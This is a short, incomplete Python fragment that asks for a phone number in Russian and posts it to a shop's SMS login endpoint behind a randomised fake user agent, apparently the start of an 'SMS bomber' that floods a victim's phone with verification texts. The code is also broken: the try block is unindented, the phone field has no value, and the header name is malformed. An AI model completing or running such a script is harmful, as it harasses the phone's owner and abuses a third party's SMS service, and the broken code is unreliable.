import requests, fake_useragent

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Введите номер телефона: (Без +)')

try:
response = requests.post('https://shop.vsk.ru/ajax/auth/postSms/' , headers=headers, data={'phone' : })
